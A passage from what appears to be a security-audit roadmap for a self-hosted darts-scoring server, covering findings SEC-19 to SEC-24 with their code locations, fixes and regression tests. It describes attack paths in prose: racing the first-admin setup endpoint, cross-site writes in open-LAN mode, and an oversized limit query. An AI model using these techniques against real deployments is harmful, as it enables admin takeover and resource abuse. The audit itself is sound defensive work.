loading the page. Under the default `OCHE_REQUIRE_AUTH=true`, this is already blocked:
the session cookie is `SameSite=Strict`, so a cross-site request never carries it and
`requireWrite`'s 401 stops it. This finding only matters for the household that
deliberately opts into the open-LAN mode the docs describe as "a fully-trusted
household network" — worth closing anyway since that's an explicit, documented,
supported configuration, not a misconfiguration.

**Fix (step by step):**
1. In `readJson()`, check `req.headers['content-type']` starts with
   `application/json` (allowing an optional `; charset=...` suffix) before parsing;
   reject with `415 Unsupported Media Type` otherwise. A cross-site "simple" request
   cannot set an arbitrary `Content-Type` like `application/json` without triggering a
   CORS preflight, which this server's `SECURITY_HEADERS` (no `Access-Control-Allow-*`
   headers at all) will fail — closing the gap without touching same-origin behavior,
   since `index.html`'s own `Backend` helper already sends `application/json`.
2. Add a committed `node:test` in `backend/test/`: a `POST` to a write route (e.g.
   `/api/badges/award`) with `Content-Type: text/plain` returns `415`; the same body
   with `Content-Type: application/json` succeeds as before.
3. Note in this doc's threat model (or the `OCHE_REQUIRE_AUTH=false` comment block at
   the top of `server.js`) that the LAN-trust mode's actual trust boundary is now "any
   device that can send a same-origin-shaped `application/json` request," which no
   longer includes an arbitrary cross-origin webpage a household member happens to
   have open.

**Verify:** the `text/plain` case returns 415 and performs no write; every existing
`index.html`/`display.html` call site (all of which already send
`Content-Type: application/json`) continues to work unchanged; full backend suite green.

### SEC-20 — `createFirstAdmin()` check-then-insert is not atomic → two concurrent setup requests can both succeed  **(MED, narrow window)**

**Status: ✅ Fixed (2026-07).** Replaced the check-then-insert with a single atomic
statement, `q.insertAdminIfNone` (`INSERT INTO admins (...) SELECT ?, ?, ? WHERE NOT
EXISTS (SELECT 1 FROM admins)`), checked via `info.changes === 0` → the existing `403
'Setup already completed'`. The plain `isSetupRequired()` check at the top of
`createFirstAdmin()` stays as a fast-path only (skips the ~50-100ms scrypt hash when
setup is obviously already done) — the real guard is the atomic insert afterward.
Committed regression test `backend/test/db.setup-race.test.js` drives two concurrent
`createFirstAdmin()` calls through `Promise.allSettled()` against a fresh scratch DB:
this genuinely interleaves (not simulated) because `auth.hashSecret()` awaits Node's
real threadpool-backed `crypto.scrypt`, so both calls actually suspend at that await
point before either reaches the database — exactly the window the vulnerability lived
in. Confirms exactly one call succeeds, the other fails closed with 403, exactly one
admin account exists afterward, and a third call after the race also fails closed.
Verified the test fails against the pre-fix code (2 admins created) and passes
against the fix. Full backend suite green (541/541).

**Where:** `backend/db.js` `createFirstAdmin()`:

```js
async function createFirstAdmin(username, password) {
  if (!isSetupRequired()) throw httpError(403, 'Setup already completed');
  username = validateCredentials(username, password);
  const { hash, salt } = await auth.hashSecret(password);   // ~50-100ms scrypt, per auth.js's own comment
  try { q.insertAdmin.run(username, hash, salt); }
  ...
```

`isSetupRequired()` (`SELECT COUNT(*) FROM admins`) is checked, then the code awaits a
~50-100ms `scrypt` hash (the same cost `auth.js`'s own header comment flags as
"blocks the event loop... since login() must pay this cost on every attempt"), and only
then inserts. Two `POST /api/setup` requests arriving close together both observe
`isSetupRequired() === true` before either has inserted, so both proceed to
`insertAdmin` — `admins.username` is `UNIQUE COLLATE NOCASE`, so this only fails if the
two requests pick the *same* username; two different usernames both succeed, silently
creating a second, unintended admin account during what the owner believes is a
single-admin first-run setup.

**Attack:** an attacker racing the legitimate owner's `/api/setup` request during the
brief window between container start and setup completion (e.g. by watching for the
server to come up, or on a slower network where the owner's own request is in flight)
submits their own `POST /api/setup` with a different username. Both requests can insert,
handing the attacker a fully-privileged, persistent admin account the owner has no
reason to suspect exists (`isSetupRequired()` is now `false`, so the setup screen never
reappears to prompt a review).

**Fix (step by step):**
1. Make the guard atomic at the database level instead of check-then-act in
   application code:
   `db.prepare("INSERT INTO admins (username, password_hash, password_salt) SELECT ?, ?, ? WHERE NOT EXISTS (SELECT 1 FROM admins)").run(username, hash, salt)`
   — then check `info.changes === 0` and throw the existing `403 'Setup already
   completed'` in that case, matching the message callers already expect.
2. Add a committed `node:test`: fire two `createFirstAdmin()` calls concurrently
   (`Promise.all`) with different usernames against a scratch DB; assert exactly one
   succeeds and `listAdmins()` has length 1 afterward.
3. `REFERENCE.md`'s setup-flow section (if it documents the endpoint's guarantees)
   gets a one-line note that first-admin creation is atomic against concurrent
   `/api/setup` calls.

**Verify:** the new concurrency test passes; a single legitimate `/api/setup` call
still succeeds exactly as before; a second call after setup still returns 403.

### SEC-21 — Request-body size cap counts decoded characters, not bytes  **(LOW)**

**Status: ✅ Fixed (2026-07).** Implemented together with BUG-10/SEC-19 (same
function). `readJson()` now accumulates raw `Buffer` chunks and tracks the running
total in real bytes (`chunk.length`) instead of decoded JS string length, decoding
to a string exactly once at `end`. **Also found and fixed in the same pass** (surfaced
by writing this finding's own regression test): the size-cap path previously called
`req.destroy(err)`, which tears the socket down before a response can be written — a
client tripping the cap saw a raw `ECONNRESET`, never the intended `413` body. Now
drains-and-discards instead (matching the precedent `handleUploadRestore()` already
established for its own oversized-upload case), so `'end'` still fires naturally and
the `413` response reaches the client over an intact connection. Committed regression
test `backend/test/server.request-body-hardening.test.js` ("SEC-21" describe block)
sends a body engineered to be under 1e6 in JS string length but over 1e6 in real UTF-8
bytes (400,000 repeats of `文`, U+6587 — 3 bytes each but 1 UTF-16 code unit) and
confirms it's rejected with a real `413` response (not a connection reset). Full
backend suite green.

**Where:** `backend/server.js` `readJson()`:

```js
req.on('data', c => {
  raw += c;
  if (raw.length > 1e6) { ... }
});
```

`c` arrives as a `Buffer`; `raw += c` implicitly decodes it to a UTF-8 string and
appends, and the cap compares `raw.length` (JS string length, i.e. UTF-16 code units)
against `1e6`. A request body consisting mostly of 4-byte UTF-8 sequences (e.g.
emoji-heavy content) can reach roughly 4x the intended ~1MB in actual network/memory
bytes before the check trips, since each 4-byte sequence can contribute as few as 1-2
JS string length units depending on surrogate-pair counting. Low severity — still a
firm, if mislabeled, ceiling — but worth fixing alongside BUG-10 below, which touches
the same accumulation loop for a data-corruption reason.

**Fix (step by step):**
1. Accumulate raw `Buffer` chunks in an array and track a running byte total via
   `chunk.length` (already correct in bytes for a `Buffer`); compare that running total
   against the cap instead of `raw.length`. `Buffer.concat(chunks).toString('utf8')`
   once at `end`. This is the same change BUG-10's fix makes for a different reason —
   implement once, get both fixes.
2. Add a committed `node:test`: a body of ~1MB of 4-byte-UTF-8 characters (well under
   1e6 JS string-length units, but over 1e6 real bytes) is now correctly rejected as
   413/`'Request body too large'`.

**Verify:** the new test passes; an ordinary ASCII body just under 1MB still succeeds;
one just over still rejects, as before.

### SEC-22 — `addTurn()` never cross-checks `scored` against the darts it's paired with  **(LOW, data-integrity, LAN-trust mode only)**

**Status: ✅ Fixed (2026-07).** `addTurn()` gained an `opts.enforceConsistency` flag
(default off) that, when set and the game is X01, requires `scored` to equal the sum
of that visit's dart face values (0 on a bust), and `checkoutPoints` to equal `scored`
on a checkout turn. **Deliberately opt-in, not the default** — an initial
default-on implementation broke 51 pre-existing test assertions across ~14 unrelated
`backend/test/db.*.test.js` files, which call `addTurn()` directly with placeholder
`scored` values that were never meant to satisfy this invariant (dart-shape
validation tests, unrelated stat-aggregation fixtures, etc.) — none of which cross the
actual trust boundary, since they bypass `server.js`/HTTP entirely. `server.js`'s
`POST /api/games/:id/turns` route — the one production call site untrusted input
actually reaches — passes `{ enforceConsistency: true }`, so the real protection is
undiminished. Cricket (and every other game type) is explicitly excluded regardless of
the flag, since `turns.scored` means something structurally different there (mark-
closing points, not a dart-value sum) — confirmed by a dedicated test that a legitimate
Cricket visit (3×T20 closing a number, scoring 120 despite 180 in raw dart value)
still passes even with the flag set. Committed regression test
`backend/test/db.turn-consistency-guard.test.js` covers the mismatch/bust/checkout/
bull-value cases directly against `addTurn()`, confirms an unflagged call is
unaffected (preserving the existing test-fixture convention), and — spawning a real
server — confirms `POST /api/games/:id/turns` rejects an inconsistent turn over the
actual HTTP API. Full backend suite green (549/549, no regressions).

**Where:** `backend/db.js` `addTurn()`. Every dart is validated individually (sector,
multiplier, physically-impossible-combination rejection) and the visit-level `scored`
is separately range-checked (`0-180`), but nothing verifies the two agree — a request
with darts worth `26` total and `scored: 180` (or a checkout's `checkoutPoints` not
matching `scored`) is accepted as-is. Under the default `OCHE_REQUIRE_AUTH=true` this
requires an admin session; under the `OCHE_REQUIRE_AUTH=false` LAN-trust opt-out this
is reachable by anyone who can reach the server, and a buggy client (not just a
hostile one) hits the same gap.

**Fix (step by step):**
1. In `addTurn()`, after validating `darts`, compute the same-shaped total
   `evaluateVisit()`/`scoring.js`'s `dartValue()` would produce (sum of each dart's
   `sector*multiplier`, with the bull-value special case) and, when `t.bust` is falsy,
   require it to equal `scored`; when `t.checkout` is truthy, require `checkoutPoints
   === scored`. Reject a mismatch with `400`.
2. Add a committed `node:test` in `backend/test/`: a turn whose `darts` sum doesn't
   match `scored` is rejected 400; a matching turn (including the `bust`/`checkout`
   special cases) still records normally.

**Verify:** the new test passes; every existing X01/Cricket/drill-mode test (which
always submits internally-consistent turns) is unaffected.

### SEC-23 — Public `?limit=` params have no upper bound on a handful of read endpoints  **(LOW)**

**Status: ✅ Fixed (2026-07).** `getGhostCandidateLegs()` now clamps to `Math.min(...,
100)`, the same ceiling `getServerErrors()` already applies to its own (admin-only)
`limit`. Swept every other public/client-controlled `limit`-style parameter in
`server.js`/`db.js` (`grep`-checked every `searchParams.get('limit')` call site and
every dynamic `LIMIT ?` in `db.js`): `/api/errors`'s `limit` is admin-only and already
clamped to 500 inside `getServerErrors()`; `/api/top-finishes` always calls
`getTopFinishesAll()` with a hardcoded `10`, never a client-controlled value — both
already safe, no change needed. Committed regression test in
`backend/test/db.ghost.test.js` seeds 150 winnable legs and confirms
`getGhostCandidateLegs(name, 999999999)` returns exactly 100 rows (clamped) while a
legitimate smaller explicit limit (50) is unaffected. Full backend suite green
(550/550).

**Where:** `backend/db.js` `getGhostCandidateLegs()` — `limit` is validated as "a
positive integer, default 20" but never capped above. `GET
/api/players/ghost-legs?name=...&limit=999999999` forces a full grouped aggregate scan
over every X01 leg the player has ever played and returns it in one response. Public,
unauthenticated, no rate-limit bucket of its own beyond the global 300/60s budget —
a cheap amplification lever relative to its cost to the server, though not remotely
comparable to a real DoS primitive.

**Fix (step by step):**
1. Clamp in `getGhostCandidateLegs()`: `const lim = Math.min(Number.isInteger(...) &&
   ... > 0 ? Number(limit) : 20, 100)`.
2. Audit the doc's own "checked and safe" assumption for every other public
   `?limit=`-style param (`/api/top-finishes`'s hardcoded `10` is fine; sweep for any
   other user-suppliable `limit`/`count` param added since Part 6) and apply the same
   cap where one is missing.
3. Add a committed `node:test`: `getGhostCandidateLegs(name, 999999)` returns at most
   100 rows.

**Verify:** the new test passes; the existing default (20) and any legitimate smaller
explicit `limit` still work unchanged.

### SEC-24 — Secure-deployment defaults (`COOKIE_SECURE`, HSTS) are opt-in with no runtime warning  **(LOW, hardening for the "may be internet-facing later" scenario)**

**Status: Open.**

**Where:** `backend/auth.js` (`COOKIE_SECURE` env var, defaults off) and
`backend/server.js`'s `SECURITY_HEADERS` (no `Strict-Transport-Security` header ever
sent). Correct and safe for the documented default deployment (plain HTTP on a trusted
LAN), but silent if the app is later placed behind a reverse proxy or exposed directly
to the internet without also setting `COOKIE_SECURE=true` — the 30-day admin session
cookie then travels over plain HTTP with no `Secure` flag and no HSTS to upgrade future
requests, and nothing in the running app's logs or `/api/errors` surfaces that
mismatch to the self-hoster.

**Fix (step by step):**
1. At server startup (`server.js`, near the existing `REQUIRE_AUTH`/`TRUST_PROXY`
   env-derived constants), log a one-time `console.warn` when `REQUIRE_AUTH` is true,
   `COOKIE_SECURE` is false, and... there's no reliable in-process signal for "this is
   reachable over the public internet" — so instead warn unconditionally at startup
   whenever `COOKIE_SECURE` is unset, framed as "set COOKIE_SECURE=true if this server
   is reachable over HTTPS from outside this host," matching the existing doc-comment
   at the top of `server.js` almost verbatim, just surfaced at runtime instead of only
   in a comment a self-hoster may never read.
2. When `COOKIE_SECURE=true`, also send `Strict-Transport-Security:
   max-age=15552000; includeSubDomains` in `SECURITY_HEADERS` (safe only to send when
   the operator has already told the app it's on HTTPS — sending it over plain HTTP
   would be actively harmful).
3. Add a one-paragraph note to the deployment section of `README.md` (or wherever
   `COOKIE_SECURE`/`TRUST_PROXY` are documented) pairing the two: "if you put this
   behind a reverse proxy, set both `COOKIE_SECURE=true` and `TRUST_PROXY=true`."

**Verify:** starting the server with `COOKIE_SECURE` unset prints the warning once;
starting with it set to `true` sends the new HSTS header and prints no warning;
existing plain-LAN deployments are otherwise unaffected (opt-in, no behavior change to
the cookie or headers when unset).

## Suggested order for Part 8

1. **SEC-18** — the one escaping gap in an otherwise-consistent file, and the only
   finding here reachable without the LAN-trust opt-out being deliberately enabled
   (an admin session can still trigger it via `/api/live`).
2. **SEC-19** — closes the CSRF gap for the documented open-LAN configuration; pairs
   naturally with SEC-21 (same function, `readJson()`).
3. **SEC-20** — narrow window, but full admin compromise if hit; the atomic-insert fix
   is small.
4. **SEC-21, SEC-22, SEC-23** — low-severity hardening, any order; SEC-21 shares an
   implementation with `docs/bug-roadmap.md` BUG-10 so do them together.
5. **SEC-24** — purely additive (a warning + an opt-in header), no urgency, do last.
